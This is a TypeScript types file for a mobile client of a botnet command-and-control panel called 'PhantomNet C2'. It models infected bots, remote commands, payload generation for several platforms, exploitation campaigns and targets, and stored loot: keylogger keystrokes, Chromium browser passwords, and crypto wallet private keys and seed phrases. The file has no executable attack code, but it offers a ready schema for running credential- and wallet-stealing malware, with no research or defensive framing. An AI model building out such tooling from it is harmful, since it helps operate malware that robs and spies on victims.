// Core Types for PhantomNet C2 Mobile App

export interface User {
  id: string;
  username: string;
  email: string;
  isAdmin: boolean;
  lastLogin?: string;
}

export interface Bot {
  id: string;
  ip_address: string;
  hostname: string;
  os_info: string;
  username: string;
  registered_at: string;
  last_seen?: string;
  status: 'active' | 'inactive' | 'offline';
  capabilities: Record<string, boolean>;
}

export interface Command {
  id: string;
  bot_id: string;
  command: string;
  args?: Record<string, any>;
  timestamp: string;
  status: 'pending' | 'running' | 'completed' | 'failed';
  result?: string;
}

export interface Target {
  id: number;
  ip_address: string;
  hostname?: string;
  os_info?: string;
  open_ports?: string[]; // JSON string
  vulnerabilities?: string[]; // JSON string
  services?: string[]; // JSON string
  discovered_at: string;
  status: 'discovered' | 'exploited' | 'failed';
  exploitation_method?: string;
  notes?: string;
}

export interface Payload {
  id: number;
  name: string;
  payload_type: string; // exe, dll, shellcode, etc.
  platform: string; // windows, linux, macos
  architecture: string; // x86, x64
  created_at: string;
  is_active: boolean;
}

export interface Campaign {
  id: number;
  name: string;
  description?: string;
  payload_id?: number;
  target_criteria?: string; // JSON string
  status: 'active' | 'paused' | 'completed';
  created_at: string;
  targets_discovered: number;
  targets_exploited: number;
  success_rate: number;
}

export interface Exploit {
  id: number;
  name: string;
  exploit_type: string; // rce, lfi, sqli, etc.
  target_platform: string;
  cve_id?: string;
  success_rate: number;
  is_active: boolean;
}

export interface Task {
  id: string;
  bot_id: string;
  task_type: string; // execute, download, upload, scan, etc.
  command: string;
  args?: string; // JSON string
  payload_id?: number;
  created_at: string;
  status: 'pending' | 'running' | 'completed' | 'failed';
  result?: string;
  execution_time?: number;
  output?: string;
  error?: string;
}

export interface SystemInfo {
  id: number;
  bot_id: string;
  system_data: string; // JSON string
  timestamp: string;
}

export interface NetworkScan {
  id: number;
  bot_id: string;
  scan_data: string; // JSON string
  timestamp: string;
}

export interface ProcessList {
  id: number;
  bot_id: string;
  process_data: string; // JSON string
  timestamp: string;
}

export interface Screenshot {
  id: number;
  bot_id: string;
  screenshot_data: string; // Base64 encoded image
  timestamp: string;
}

export interface KeyloggerData {
  id: number;
  bot_id: string;
  keystroke_data: string; // JSON string
  timestamp: string;
}

export interface ChromiumCredentials {
  id: number;
  bot_id: string;
  url: string;
  username: string;
  password: string;
  browser: string;
  timestamp: string;
}

export interface CryptoWallet {
  id: number;
  bot_id: string;
  wallet_name: string;
  wallet_path: string;
  wallet_data: string; // JSON string
  private_key?: string;
  mnemonic_phrase?: string;
  timestamp: string;
}

export interface ServerStats {
  total_bots: number;
  active_bots: number;
  total_commands: number;
  pending_commands: number;
  total_targets: number;
  exploited_targets: number;
  total_campaigns: number;
  active_campaigns: number;
  total_payloads: number;
  total_tasks: number;
}

export interface ApiResponse<T> {
  success: boolean;
  data?: T;
  error?: string;
  message?: string;
}

export interface LoginCredentials {
  username: string;
  password: string;
}

export interface ServerConfig {
  url: string;
  port: number;
  useSSL: boolean;
  timeout: number;
}

export interface PayloadGenerationRequest {
  name: string;
  platform: 'windows' | 'linux' | 'macos';
  architecture: 'x86' | 'x64';
  payload_type?: 'exe' | 'dll' | 'elf' | 'sh' | 'macho';
}

export interface TargetDiscoveryRequest {
  criteria: {
    query?: string;
    network?: string;
    ports?: string;
    domain?: string;
    wordlist?: string;
    page?: number;
  };
}

export interface CommandRequest {
  bot_id: string;
  command: string;
  args?: Record<string, any>;
}

export interface CampaignRequest {
  name: string;
  description?: string;
  payload_id?: number;
  target_criteria: Record<string, any>;
}

// Navigation Types
export type RootStackParamList = {
  Login: undefined;
  Dashboard: undefined;
  Bots: undefined;
  BotDetails: { botId: string };
  Commands: undefined;
  Payloads: undefined;
  Targets: undefined;
  Campaigns: undefined;
  Settings: undefined;
  Database: undefined;
};

// Component Props Types
export interface BotCardProps {
  bot: Bot;
  onPress: () => void;
}

export interface CommandCardProps {
  command: Command;
  onPress: () => void;
}

export interface TargetCardProps {
  target: Target;
  onPress: () => void;
}

export interface PayloadCardProps {
  payload: Payload;
  onPress: () => void;
}

export interface CampaignCardProps {
  campaign: Campaign;
  onPress: () => void;
}

// Form Types
export interface LoginFormData {
  username: string;
  password: string;
}

export interface PayloadFormData {
  name: string;
  platform: 'windows' | 'linux' | 'macos';
  architecture: 'x86' | 'x64';
  payload_type: 'exe' | 'dll' | 'elf' | 'sh' | 'macho';
}

export interface CommandFormData {
  bot_id: string;
  command: string;
  args?: string; // JSON string
}

// Error Types
export interface ApiError {
  code: string;
  message: string;
  details?: any;
}

// Theme Types
export interface ThemeColors {
  primary: string;
  secondary: string;
  accent: string;
  background: string;
  surface: string;
  text: string;
  textSecondary: string;
  error: string;
  success: string;
  warning: string;
}

// Utility Types
export type LoadingState = 'idle' | 'loading' | 'success' | 'error';

export interface AsyncState<T> {
  data: T | null;
  loading: boolean;
  error: string | null;
}
